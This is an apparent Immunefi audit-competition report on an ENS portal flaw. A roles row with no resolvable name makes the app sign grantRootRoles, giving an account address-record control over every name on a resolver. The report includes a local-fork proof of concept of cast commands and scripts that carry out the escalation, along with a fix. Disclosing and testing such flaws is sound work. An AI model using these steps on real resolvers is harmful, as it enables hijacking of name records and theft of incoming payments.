# 89483 w a critical empty resolvednames falls back to root scope so editing one role row signs grantrootroles over every name on the resolver

**Submitted on Aug 19th 2026 at 15:29:43 UTC by @tchoupilou for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89483
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

On the resolver roles page, a row whose resource cannot be matched against the resolver's current node list ends up with an empty name, and the helper that builds the transaction treats an empty name as root scope. An administrator editing that one row therefore signs `grantRootRoles` instead of `authorizeNameRoles`, which grants the account in the row those roles across every name on the resolver rather than the single name the row represented. In production this means an account that was delegated one name gains `ROLE_SET_ADDR` over all of them and can rewrite the address record of every name using that resolver, so funds sent to any of those names go to an address the attacker chose.

## Vulnerability Details

### The fallback

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx`:

```ts
const resolvedNames = row?.original.resolvedNames ?? []          // line 167
const roleName = resolvedNames.find((n) => n !== '(root)') ?? '' // line 169
```

Both write paths in that file use it:

```ts
const handleSaveChanges = () => {                        // line 295
  if (!selectedAccount || saveMutation.isPending) return
  setPendingAction({
    type: 'save',
    name: roleName,                                      // line 299
    account: selectedAccount,
    rolesToGrant: rolesToGrant,
    rolesToRevoke: rolesToRevoke,
  })
  openModal()
}

const handleRemoveUser = () => {                         // line 307
  if (
    !selectedAccount ||
    decodedRoles.length === 0 ||
    removeUserMutation.isPending
  )
    return

  removeUserMutation.reset()
  setPendingAction({
    type: 'remove',
    name: roleName,                                      // line 318
    account: selectedAccount,
    roles: decodedRoles,
  })
  openModal()
}
```

The confirmation modal passes that object straight to the mutation, at `:486-502`. Nothing in between re-derives a scope:

```ts
onStart: () => {
  if (!pendingAction) return
  if (pendingAction.type === 'remove') {
    removeUserMutation.mutate({
      name: pendingAction.name,
      account: pendingAction.account,
      roles: pendingAction.roles,
    })
    return
  }
  saveMutation.mutate({
    name: pendingAction.name,
    account: pendingAction.account,
    rolesToGrant: pendingAction.rolesToGrant,
    rolesToRevoke: pendingAction.rolesToRevoke,
  })
},
```

A save is up to two transactions. `saveMutation` diffs the checkboxes and both legs get the same `name`, at `:212-224` and `:226-238`:

```ts
if (rolesToGrant.length > 0) {
  await grantResolverRoles({ resolverAddress, name, account, roles: rolesToGrant, ... })
}

if (rolesToRevoke.length > 0) {
  await revokeResolverRoles({ resolverAddress, name, account, roles: rolesToRevoke, ... })
}
```

So when `roleName` is empty, both legs are root scoped: roles being added are granted on every name, and roles being removed are revoked at root instead of on the name the row showed.

`apps/portal/src/features/resolver/helpers/grantResolverRoles.ts` states what an empty string means and then acts on it:

```ts
/** Dotted name (e.g. "myname.eth") or empty string for ROOT_RESOURCE (all names). */
readonly name: string                                            // line 20
```

```ts
const writeParams = grantResolverRolesWriteParameters(           // line 45
  walletClient as Parameters<typeof grantResolverRolesWriteParameters>[0],
  name === ''
    ? { resolverAddress, targetAccount: account, scope: 'root', roles }
    : { resolverAddress, targetAccount: account, scope: 'name', name, roles },
)
```

`revokeResolverRoles.ts` has the same branch at its own line 45.

These are two different contract functions, not one function with a different argument. The `name` branch calls `authorizeNameRoles(bytes,uint256,address,bool)`, selector `0xbbd9abb5`, which carries the DNS-encoded name as its first argument. The `root` branch calls `grantRootRoles(uint256,address)`, selector `0x072d5d77`, which has no name argument at all.

### Why the name list can be empty

The empty state comes from `apps/portal/src/lib/roles/resolverRoles.ts`.

`buildResourceToNameMap` at line 147 holds the root resource plus one computed resource per node, and nothing else:

```ts
const map = new Map<string, string>()
map.set(ROOT_RESOURCE, '(root)')

for (const node of nodes) {
  if (node.name) {
    map.set(computeNameResource(node.name).toLowerCase(), node.name)
  }
}
```

`groupRolesByAccount` at line 179 records a name only when that lookup succeeds:

```ts
const resolvedName = resourceToName?.get(resource) ?? null   // line 197
...
if (resolvedName) existing.resolvedNames.add(resolvedName)   // line 204
...
if (resolvedName) names.add(resolvedName)                    // line 207
...
resolvedNames: Array.from(g.resolvedNames),                  // line 219
```

There is no else branch. A miss adds nothing and the row is emitted with `resolvedNames: []`.

### Route 1: repointing a name

This route needs no unusual scope, and the attacker controls every step of it.

The two lists that produce a row come from one query but are independent of each other, at `apps/portal/src/routes/resolver/$address/roles/index.tsx`:

```ts
const roles = resolver?.roles ?? []      // line 61
const nodes = resolver?.nodes ?? []      // line 62
```

They are passed straight to `ResolverRolesTable`, which pairs them at line 103:

```ts
() => groupRolesByAccount(roles, buildResourceToNameMap(nodes)),
```

`nodes` is the set of names currently pointing at this resolver, so it follows where names point. `roles` is the set of grants recorded on the resolver contract, keyed by resource, so it follows what was granted and does not track where the name points. Repointing a name changes the first list and not the second.

That gives the attacker four steps:

{% stepper %}
{% step %}

## The attacker owns `bob.eth` and points it at the shared resolver.

{% endstep %}

{% step %}

## They are granted a name-scoped role on `bob.eth`, because that is the access they asked for.

{% endstep %}

{% step %}

## They repoint `bob.eth` at a different resolver.

One transaction, theirs to make.
{% endstep %}

{% step %}

## `bob.eth` leaves this resolver's `nodes`, the grant stays in `roles`, and their row has no resolvable name from that point on.

{% endstep %}
{% endstepper %}

### Route 2: scopes the map cannot hold

The resolver has more role scopes than the map has entry types.

`computeNameResource` at line 138 computes `resource(node, 0)` and nothing else:

```ts
export const computeNameResource = (name: string): string =>
  keccak256(
    encodePacked(['bytes32', 'bytes32'], [namehash(name), ZERO_BYTES32]),
  )
```

The `@ensdomains/ensjs` build this repo pins grants four scopes. Besides `root` and `name` there are `text`, keyed by a text record key, and `addr`, keyed by a coin type. They are separate contract functions: `name` calls `authorizeNameRoles(bytes,uint256,address,bool)`, `text` calls `authorizeTextRoles(bytes,string,address,bool)`, `addr` calls `authorizeAddrRoles(bytes,uint256,address,bool)`.

A role granted through `authorizeTextRoles` or `authorizeAddrRoles` sits on a resource that is not `resource(node, 0)`, so `buildResourceToNameMap` never contains it and the lookup can never succeed. That covers every narrowly scoped role, including the ordinary case of letting somebody edit one text record on one name.

The indexer does record such roles. Role changes surface as one generic event carrying the resource, declared at `apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts:43-48`:

```ts
type EACRolesChangedPayload = {
  resource: string
  account: string
  oldRoleBitmap: string
  newRoleBitmap: string
}
```

`EACRolesChanged` is the Enhanced Access Control event, emitted for any role change on any resource, and the comment at lines 55 to 60 of the same file confirms the indexer also exposes a resource-keyed roles field. Nothing in the event shape excludes a narrow scope. This is supporting evidence only, since Route 1 needs no assumption about the indexer.

### The app already has the name and drops it

The GraphQL query in `apps/portal/src/features/resolver/hooks/useResolverOverview.ts` requests `name` on every role, and the type declares it:

```ts
export type ResolverRole = {
  readonly account: string
  readonly resource: string
  readonly roleBitmap: string
  readonly blockNumber: number
  readonly transactionHash: string | null
  readonly timestamp: number | null
  readonly name: string | null          // supplied, and nullable
}
```

`RoleInput`, the type `groupRolesByAccount` consumes, does not include `name`, and no file under `apps/portal/src/features/resolver` reads it. The app requests the authoritative name, discards it, and rebuilds a name from the node list.

That field is also nullable in the app's own schema, so the schema allows a role with no resolvable name. The grouping code has no branch for it.

### Precondition, and a second defect on the same line

The grouping is by account, not by resource. `groupRolesByAccount` unions every resource an account holds into one row, so the escalation needs the account to have no mappable resource at all. If the account also holds a role on a name still in `nodes`, `resolvedNames` is non-empty and the write is name-scoped as intended. Route 1 satisfies the precondition by repointing the one name the account had.

The same line has a second defect. When an account holds several mappable names, `find` returns the first one and the save applies only to that name, dropping the rest. The empty case over-grants and the multiple case under-applies, both because line 169 collapses a set of resources into one optional name.

### Why the transaction succeeds rather than reverting

`grantRootRoles` is not free. The SDK states that for `scope: 'root'` the caller must hold the admin variant of each role. The administrator who can reach this screen does.

The page gates the edit action on a root check at `routes/resolver/$address/roles/index.tsx:41-50`, which passes `resolverAddress`, `roles` and `account` with no `resource` field:

```ts
const { data: hasRootRole } = useQuery({
  ...getHasRolesQueryOptions({
    resolverAddress: address as Address,
    roles: ['ROLE_SET_ADDR'],
    account: accountAddress as Address,
  }),
  enabled: !!accountAddress,
})
const canManageRoles = Boolean(hasRootRole)
```

The missing `resource` field is what selects root. `@ensdomains/ensjs` types that shape as its resolver root mode, `{ resolverAddress, roles, account }`, and dispatches on `if ('resource' in params)` at `src/actions/public/v2/hasRoles.ts:160`.

That gate is narrower than the transaction it authorizes: it checks one role, `ROLE_SET_ADDR`. An administrator could pass it and still lack the admin variant of another role included in the save, in which case `grantRootRoles` reverts. For resolvers created through the Manager registration flow this does not happen, because the owner gets the full nybble bitmap at initialization, at `packages/transaction-manager/src/machines/registration/registration.actors.ts:99-104`:

```ts
functionName: 'initialize',
args: [ownerAddress, DEDICATED_RESOLVER_ROLE_BITMAP, []],
```

`DEDICATED_RESOLVER_ROLE_BITMAP` is `0x1111...1111`. It sets every fourth bit, so it contains `ROLE_SET_ADDR` at bit 0 and `ROLE_SET_ADDR_ADMIN` at bit 128. The person clicking save holds the admin variant at root.

The authority is also new, not carried over. Before the edit the account holds one role on one resource: one name, or one text key on a name, or one coin type on a name. After it, the SDK describes what was signed as granting roles globally, any name and any record type.

### Recommended fix

Do not infer the scope from an empty string. Carry it explicitly.

The smallest correct change is to use the name the indexer already returns. `ResolverRole.name` is requested and available. Add it to `RoleInput` and, in `groupRolesByAccount`, fall back to `role.name` when the resource map misses, so a row for a known name keeps that name.

Separately, an empty string must stop meaning root. Give the row an explicit scope, for example `{ scope: 'root' } | { scope: 'name', name: string }`, and have the sidebar pass it through instead of rebuilding it. Root scope should only be reachable from a row whose resource is `ROOT_RESOURCE`.

Until the scope is explicit, both write handlers should refuse to submit when `resolvedNames` is empty and the row's resource is not the root resource, rather than defaulting to the wider authority.

## Impact Details

**What is granted.** The administrator signs `grantRootRoles(uint256,address)`. Root scope on a resolver covers every name that uses it, so the account in the row receives the checked roles on all of them, not on the one name the row displayed.

**Who receives it.** The account in the row. In a delegation setup that is a third party: a contractor, a team member, or a service that was meant to manage a single name. Under Route 1 that account is the attacker, who arranged the unmappable row on purpose.

**Funds at risk.** A resolver holds the address records for the names that use it. `ROLE_SET_ADDR` at root lets the account call `setAddr` on any node on that resolver. Any wallet, app or payment flow that resolves one of those names reads the record the attacker wrote and sends funds to the attacker's address. The amount at risk is every payment routed through any name on that resolver for as long as the record stands, and nothing in the contract caps it. On a resolver serving a single personal name the exposure is that person's incoming payments. On a shared or organisational resolver, one signature exposes the incoming payments of every name on it at once. Beyond payments, the same authority lets the attacker point those names at contracts they control, so anything that resolves a name to an address before interacting with it is affected.

**Nothing warns the administrator.** The row shows no name, because the Name cell returns nothing at `ResolverRolesTable.tsx:70`:

```tsx
const names = row.original.resolvedNames
if (names.length === 0) return null
```

The scope caption is hidden on the same condition at `ResolverRolesSidebar.tsx:391`:

```tsx
{selectedAccount && resolvedNames.length > 0 && (
  <p className="text-sm text-muted-foreground">
    {resolvedNames.includes('(root)')
      ? 'Global roles (all names)'
      : `Roles scoped to ${resolvedNames.filter((n) => n !== '(root)').join(', ')}`}
  </p>
)}
```

The line that would have read "Global roles (all names)" is suppressed exactly when the scope is about to become root. The administrator sees one account, no name, no scope line, and a set of checkboxes.

**The remove path fails the other way.** `handleRemoveUser` passes the same empty `roleName`, so `revokeResolverRoles.ts` line 45 selects root scope and the transaction becomes `revokeRootRoles(uint256,address)`, selector `0xce156e82`. That clears root roles the account may not hold, while its actual name-scoped grant, the one the row displayed, is untouched. The administrator sees a successful transaction and the access they meant to remove is still in place. The same missing branch therefore produces an over-grant on save and a silent no-op on remove.

**Match with the selected impact.** The selected impact is "Malicious interactions with an already-connected wallet", which the program lists at Critical and defines to include modified transaction arguments and a substituted contract call. Both are present. The function that reaches the wallet is `grantRootRoles`, not the `authorizeNameRoles` the row's action implies, and its scope argument covers the whole resolver rather than the one name on screen. The attacker does not forge the transaction, the application does. What the attacker controls is the precondition, and completely: pointing a name at the resolver, accepting a narrow role, and repointing that name away are three ordinary actions, all theirs, and together they guarantee an unmappable row. The escalation then happens on the next routine edit of that row.

**Reversibility.** The role state can be undone, since an administrator who notices can revoke the root roles. The losses cannot. The account can rewrite the address record of every name on the resolver from the moment the transaction confirms, and funds sent during that window are gone. Nothing shortens the window, because nothing announces it: no name in the row, no scope caption, no mention of root in the confirmation.

**Not a known issue.** The known issues list QA-01 for role combinations causing errors in later actions, and states in the same entry that a demonstrated security consequence, such as a role combination that grants unintended authority, would be a new finding. Granting root scope where name scope was intended is unintended authority, demonstrated in the PoC below on a local fork of the deployed resolver. It is not R2, R3, SEC-MGR, SEC-TXM or any EXP entry, none of which touch resolver role scoping.

## References

All repository paths at commit 1c9b47f1.

* Asset: <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx` lines 167, 169, 212, 226, 295, 299, 307, 318, 391, 486, 496, 502
* `apps/portal/src/features/resolver/helpers/grantResolverRoles.ts` line 20 for the doc comment, line 45 for the branch
* `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts` line 45
* `apps/portal/src/lib/roles/resolverRoles.ts` lines 129, 138, 147, 162, 179, 197, 204, 207, 219
* `apps/portal/src/features/resolver/components/ResolverRolesTable.tsx` lines 70 and 103
* `apps/portal/src/routes/resolver/$address/roles/index.tsx` lines 41, 50, 61, 62, 86
* `apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts` lines 43 to 48 for the EACRolesChanged payload, lines 55 to 60 for the indexer's resource-keyed roles field
* `apps/portal/src/features/resolver/hooks/useResolverOverview.ts` for the ResolverRole type and the query that requests name
* `packages/transaction-manager/src/machines/registration/registration.actors.ts` lines 71, 99, 103
* `pnpm-workspace.yaml` line 10, the pinned @ensdomains/ensjs preview build e96662c
* @ensdomains/ensjs, `src/actions/wallet/v2/grantResolverRoles.ts`, for the four scopes and the description of root grants
* @ensdomains/ensjs, `src/actions/public/v2/hasRoles.ts` line 160, where a missing resource field selects resolver root mode
* Sepolia addresses used by the local fork, from `ensL1Contracts[supportedL1Chains.sepolia]`: ensPermissionedResolverImpl `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e`, ensVerifiableFactory `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef`

## Proof of Concept

All testing was done on a local anvil fork. No mainnet or public testnet deployed code was touched, and no live instance of the portal was used.

Run order. Steps 4 and 5 create `poc3.ts`, which step 3 needs, so run 4 and 5 first. The numbering follows the argument, not the execution order: the on-chain result comes first because it settles the finding.

Steps 1 to 3 run against a local fork of Sepolia with the deployed `PermissionedResolver` implementation, so the answers come from the contract. They use one role throughout, `ROLE_SET_ADDR`, bitmap `1`, so the only thing that changes between the correct call and the app's call is the scope. Steps 4 to 7 show the application-side cause. Steps 8 and 9 are the negative controls, on chain and in the application. Step 10 is the manual reproduction against a locally running portal.

Output blocks show reads only, plus the one expected revert in step 8. The `cast send` receipts in between carry nothing beyond `status: 0x1`.

{% stepper %}
{% step %}

## Deploy a resolver the way the app does

Fork Sepolia locally. The addresses come from `ensL1Contracts[supportedL1Chains.sepolia]` and the initialization bitmap is the app's own `DEDICATED_RESOLVER_ROLE_BITMAP`.

```bash
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --fork-block-number 11522608 --port 8545 &   # 19 August 2026, 14:21 UTC

R=http://127.0.0.1:8545
IMPL=0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e      # ensPermissionedResolverImpl
FACTORY=0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef   # ensVerifiableFactory
OWNER=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266     # anvil #0, the resolver admin
OK=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
TARGET=0x70997970C51812dc3A010C7d01b50e0d17dc79C8    # anvil #1, the account in the row
TK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
ROLES_ALL=0x1111111111111111111111111111111111111111111111111111111111111111
BOB=0x03626f620365746800                             # dns-encoded bob.eth

INIT=$(cast calldata 'initialize(address,uint256,bytes[])' $OWNER $ROLES_ALL '[]')
RES=$(cast send $FACTORY 'deployProxy(address,uint256,bytes)' $IMPL 12345 "$INIT" \
  --private-key $OK --rpc-url $R --json | jq -r '.logs[0].address')
echo $RES
```

```
0x9a5585fce66b1a9c14cf62e9216fea310a8585b8
```

The proxy emits its initialization logs first, so `logs[0].address` is the new resolver and the factory's own log comes last.

Confirm the functions used below exist in the deployed implementation rather than assuming the signatures:

```bash
cast sig 'setAddr(bytes32,uint256,bytes)'
cast code $IMPL --rpc-url $R | grep -c 8b95dd71
cast sig 'setAddr(uint256,bytes)'
cast code $IMPL --rpc-url $R | grep -c 8dfcb5cf
cast sig 'hasRootRoles(uint256,address)'
cast code $IMPL --rpc-url $R | grep -c 781ef8db
cast sig 'grantRootRoles(uint256,address)'
cast code $IMPL --rpc-url $R | grep -c 072d5d77
```

```
0x8b95dd71
1
0x8dfcb5cf
0
0x781ef8db
1
0x072d5d77
1
```

The node-taking form of `setAddr` is in the bytecode and the node-less form is not, so `setAddr(bytes32,uint256,bytes)` is the right call here. `hasRootRoles` and `grantRootRoles` are present too.
{% endstep %}

{% step %}

## A correctly scoped grant gives no root authority

Grant the account the narrow role it is entitled to, `ROLE_SET_ADDR` scoped to `bob.eth`, and read root authority before and after.

```bash
cast call $RES 'hasRootRoles(uint256,address)(bool)' 1 $TARGET --rpc-url $R
cast send $RES 'authorizeNameRoles(bytes,uint256,address,bool)' $BOB 1 $TARGET true \
  --private-key $OK --rpc-url $R
cast call $RES 'hasRootRoles(uint256,address)(bool)' 1 $TARGET --rpc-url $R
```

```
false
false
```

No root authority before, and none after. That is the intended behaviour.
{% endstep %}

{% step %}

## The transaction the app produces gives root authority

Re-run `poc3.ts` from step 5 with this fork's addresses, so the bytes below come from the repository's own code rather than being typed by hand.

```bash
sed -i.bak -e "s/0x1111111111111111111111111111111111111111/$RES/" \
           -e "s/0x2222222222222222222222222222222222222222/$TARGET/" poc3.ts
NODE_PATH=$PWD/node_modules npx tsx poc3.ts
```

```
resolvedNames for the row : []
roleName (line 169)       : ""
grantResolverRoles branch : scope 'root'
calldata actually signed  : 0x072d5d77000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
```

Send those bytes unmodified, read the state back, then have the account write a record on an unrelated node.

```bash
CD=0x072d5d77000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
cast send $RES --data $CD --private-key $OK --rpc-url $R
cast call $RES 'hasRootRoles(uint256,address)(bool)' 1 $TARGET --rpc-url $R

ALICE=$(cast namehash alice.eth)
cast send $RES 'setAddr(bytes32,uint256,bytes)' $ALICE 60 $OWNER --private-key $TK --rpc-url $R
cast call $RES 'addr(bytes32,uint256)(bytes)' $ALICE 60 --rpc-url $R
```

```
true
0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
```

The application's code printed those bytes, those bytes went on chain, the account went from no root authority to root authority, and it then wrote the address record of `alice.eth`, a name that was never part of the row being edited.

This is a freshly deployed resolver, so no name in the registry points at it yet and `alice.eth` here is a node hash. That is the right test: a `PermissionedResolver` stores records per node, and the only thing between a caller and any node is the role check. The write succeeding shows the role gate yielded for a node the account has no name-scoped grant on. In the real setting the resolver is shared and `alice.eth` is one of the names pointing at it, which is what turns the same write into a redirected address record.

Step 8 runs the same account, role and node with a correctly scoped grant, and the write fails.
{% endstep %}

{% step %}

## Set up the application-side reproduction

Clone the repo at the reviewed commit and prepare a scratch directory next to it. The `ensjs` version is the preview build pinned in `pnpm-workspace.yaml` line 10, so the write helpers are the ones the app uses.

```bash
git clone https://github.com/immunefi-team/audit-comp-ens
cd audit-comp-ens && git checkout 1c9b47f1 && REPO=$PWD && cd ..

mkdir poc && cd poc && npm init -y
npm install viem tsx "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c"
```

{% endstep %}

{% step %}

## The app's own code produces root-scoped calldata for a row with no name

The script imports `buildResourceToNameMap`, `groupRolesByAccount` and `computeNameResource` from the repo unmodified, applies `ResolverRolesSidebar.tsx` line 169 verbatim, and builds both transactions.

The state modelled is the one from Route 1: the account holds a role on `bob.eth`, and `bob.eth` has been repointed to another resolver, so it is no longer in `nodes` while its grant is still in `roles`.

```bash
cat > poc3.ts <<'EOF'
import {
  buildResourceToNameMap,
  groupRolesByAccount,
  computeNameResource,
} from './REPO/apps/portal/src/lib/roles/resolverRoles'
import { grantResolverRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import { encodeFunctionData } from 'viem'

const RESOLVER = '0x1111111111111111111111111111111111111111'
const TARGET   = '0x2222222222222222222222222222222222222222'
const ADMIN    = '0x3333333333333333333333333333333333333333'

const nodes = [{ name: 'alice.eth' }]
const roles = [{
  account: TARGET,
  resource: computeNameResource('bob.eth').toLowerCase(),
  roleBitmap: '0x' + (1n << 0n).toString(16).padStart(64, '0'), // ROLE_SET_ADDR
}]

const grouped = groupRolesByAccount(roles, buildResourceToNameMap(nodes))
const row = grouped[0]
console.log('resolvedNames for the row :', JSON.stringify(row.resolvedNames))

// ResolverRolesSidebar.tsx line 169, verbatim
const roleName = row.resolvedNames.find((n) => n !== '(root)') ?? ''
console.log('roleName (line 169)       :', JSON.stringify(roleName))
console.log('grantResolverRoles branch :', roleName === '' ? "scope 'root'" : "scope 'name'")

const walletStub: any = { account: { address: ADMIN }, chain: { id: 11155111 } }
const build = (name: string) => {
  const p: any = grantResolverRolesWriteParameters(walletStub,
    name === ''
      ? { resolverAddress: RESOLVER, targetAccount: TARGET, scope: 'root', roles: ['ROLE_SET_ADDR'] }
      : { resolverAddress: RESOLVER, targetAccount: TARGET, scope: 'name', name, roles: ['ROLE_SET_ADDR'] })
  return encodeFunctionData({ abi: p.abi, functionName: p.functionName, args: p.args } as any)
}

const actual   = build(roleName)      // what the app signs
const intended = build('bob.eth')     // what the row represented

console.log()
console.log('calldata actually signed  :', actual)
console.log('calldata for bob.eth only :', intended)
console.log('same?', actual === intended)
console.log()
console.log('root resource             :', '0x' + '00'.repeat(32))
console.log('bob.eth resource          :', computeNameResource('bob.eth'))
EOF

sed -i.bak "s#./REPO#$REPO#" poc3.ts   # -i.bak for macOS portability
NODE_PATH=$PWD/node_modules npx tsx poc3.ts
```

```
resolvedNames for the row : []
roleName (line 169)       : ""
grantResolverRoles branch : scope 'root'

calldata actually signed  : 0x072d5d7700000000000000000000000000000000000000000000000000000000000000010000000000000000000000002222222222222222222222222222222222222222
calldata for bob.eth only : 0xbbd9abb50000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000100000000000000000000000022222222222222222222222222222222222222220000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000903626f6203657468000000000000000000000000000000000000000000000000
same? false

root resource             : 0x0000000000000000000000000000000000000000000000000000000000000000
bob.eth resource          : 0xe3f4672e728b79206ba500b850eb553d617e3156863fda5c15fb6e97ff4156e9
```

The row carries no name, line 169 turns that into `''`, the helper picks root scope, and the calldata starts with a different selector from the one the row implies.
{% endstep %}

{% step %}

## The two branches are two different contract functions

```bash
cat > sigs.ts <<'EOF'
import { grantResolverRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import { revokeResolverRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import { toFunctionSelector, toFunctionSignature } from 'viem'

const w: any = { account: { address: '0x3333333333333333333333333333333333333333' }, chain: { id: 11155111 } }
const R = '0x1111111111111111111111111111111111111111'
const T = '0x2222222222222222222222222222222222222222'

const show = (fn: any, tag: string, args: any) => {
  const p: any = fn(w, args)
  const item = p.abi.find((x: any) => x.name === p.functionName)
  console.log(tag.padEnd(18), toFunctionSignature(item), toFunctionSelector(item))
}

show(grantResolverRolesWriteParameters, 'grant scope root',
  { resolverAddress: R, targetAccount: T, scope: 'root', roles: ['ROLE_SET_ADDR'] })
show(grantResolverRolesWriteParameters, 'grant scope name',
  { resolverAddress: R, targetAccount: T, scope: 'name', name: 'bob.eth', roles: ['ROLE_SET_ADDR'] })
show(revokeResolverRolesWriteParameters, 'revoke scope root',
  { resolverAddress: R, targetAccount: T, scope: 'root', roles: ['ROLE_SET_ADDR'] })
show(revokeResolverRolesWriteParameters, 'revoke scope name',
  { resolverAddress: R, targetAccount: T, scope: 'name', name: 'bob.eth', roles: ['ROLE_SET_ADDR'] })
EOF
NODE_PATH=$PWD/node_modules npx tsx sigs.ts
```

```
grant scope root   grantRootRoles(uint256,address) 0x072d5d77
grant scope name   authorizeNameRoles(bytes,uint256,address,bool) 0xbbd9abb5
revoke scope root  revokeRootRoles(uint256,address) 0xce156e82
revoke scope name  authorizeNameRoles(bytes,uint256,address,bool) 0xbbd9abb5
```

The save path signs `grantRootRoles` instead of `authorizeNameRoles`, which is why there is no name in that calldata. The remove path signs `revokeRootRoles`, which clears root roles the account does not hold and leaves its name-scoped grant in place.
{% endstep %}

{% step %}

## A narrow role can never be mapped

```bash
cat > scopes.ts <<'EOF'
import { grantResolverRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import { computeNameResource } from './REPO/apps/portal/src/lib/roles/resolverRoles'
import { toFunctionSignature } from 'viem'

const w: any = { account: { address: '0x3333333333333333333333333333333333333333' }, chain: { id: 11155111 } }
const R = '0x1111111111111111111111111111111111111111'
const T = '0x2222222222222222222222222222222222222222'
const NAME = 'bob.eth'

const show = (tag: string, args: any) => {
  const p: any = grantResolverRolesWriteParameters(w, args)
  const item = p.abi.find((x: any) => x.name === p.functionName)
  console.log(tag.padEnd(12), toFunctionSignature(item))
  console.log('   args:', JSON.stringify(p.args, (_k, v) => typeof v === 'bigint' ? v.toString() : v))
}

show("scope name", { resolverAddress: R, targetAccount: T, scope: 'name', name: NAME, roles: ['ROLE_SET_ADDR'] })
show("scope text", { resolverAddress: R, targetAccount: T, scope: 'text', name: NAME, key: 'com.twitter' })
show("scope addr", { resolverAddress: R, targetAccount: T, scope: 'addr', name: NAME, coinType: 60n })

console.log()
console.log("the ONLY resource the portal can map (computeNameResource, resource(node,0)):")
console.log("  ", computeNameResource(NAME))
EOF

sed -i.bak "s#./REPO#$REPO#" scopes.ts
NODE_PATH=$PWD/node_modules npx tsx scopes.ts
```

```
scope name   authorizeNameRoles(bytes,uint256,address,bool)
   args: ["0x03626f620365746800","1","0x2222222222222222222222222222222222222222",true]
scope text   authorizeTextRoles(bytes,string,address,bool)
   args: ["0x03626f620365746800","com.twitter","0x2222222222222222222222222222222222222222",true]
scope addr   authorizeAddrRoles(bytes,uint256,address,bool)
   args: ["0x03626f620365746800","60","0x2222222222222222222222222222222222222222",true]

the ONLY resource the portal can map (computeNameResource, resource(node,0)):
   0xe3f4672e728b79206ba500b850eb553d617e3156863fda5c15fb6e97ff4156e9
```

Three contract functions place a role on three different resources. The portal computes one of them. A role granted through `authorizeTextRoles` or `authorizeAddrRoles` therefore always lands in the unmapped case of step 5, whatever the node list contains.
{% endstep %}

{% step %}

## On-chain negative control

Deploy a second resolver, grant the same account the same role on the same name the correct way, and compare what it can reach.

```bash
INIT=$(cast calldata 'initialize(address,uint256,bytes[])' $OWNER $ROLES_ALL '[]')
RES2=$(cast send $FACTORY 'deployProxy(address,uint256,bytes)' $IMPL 999 "$INIT" \
  --private-key $OK --rpc-url $R --json | jq -r '.logs[0].address')

cast send $RES2 'authorizeNameRoles(bytes,uint256,address,bool)' $BOB 1 $TARGET true \
  --private-key $OK --rpc-url $R
cast call $RES2 'hasRootRoles(uint256,address)(bool)' 1 $TARGET --rpc-url $R

cast send $RES2 'setAddr(bytes32,uint256,bytes)' $ALICE 60 $OWNER --private-key $TK --rpc-url $R
cast call $RES2 'addr(bytes32,uint256)(bytes)' $ALICE 60 --rpc-url $R

BOBN=$(cast namehash bob.eth)
cast send $RES2 'setAddr(bytes32,uint256,bytes)' $BOBN 60 $OWNER --private-key $TK --rpc-url $R
cast call $RES2 'addr(bytes32,uint256)(bytes)' $BOBN 60 --rpc-url $R
```

```
false
Error: server returned an error response: execution reverted
0x
0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
```

Same account, same role, same nodes. Granted through `authorizeNameRoles` it holds no root authority, its write to `alice.eth` reverts and that record stays empty, and its write to `bob.eth`, the name it was granted, succeeds. The role behaves as designed when it is scoped correctly. The only thing that changed in step 3 is which function the application chose.
{% endstep %}

{% step %}

## Application-side negative control

Change one line so the node list covers the name the role is on. Copy from the backup that step 3's `sed` left, so the addresses are the original placeholders.

```bash
cp poc3.ts.bak poc3-control.ts
sed -i.bak "s/const nodes = \[{ name: 'alice.eth' }\]/const nodes = [{ name: 'alice.eth' }, { name: 'bob.eth' }]/" poc3-control.ts
NODE_PATH=$PWD/node_modules npx tsx poc3-control.ts
```

```
resolvedNames for the row : ["bob.eth"]
roleName (line 169)       : "bob.eth"
grantResolverRoles branch : scope 'name'

calldata actually signed  : 0xbbd9abb50000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000100000000000000000000000022222222222222222222222222222222222222220000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000903626f6203657468000000000000000000000000000000000000000000000000
same? true
```

With the name present the row resolves, line 169 returns `bob.eth`, the helper picks name scope, and the calldata matches the intended one. Everything else in the script is unchanged, so the only thing that moved the transaction from one name to every name is whether the name was in the node list.
{% endstep %}

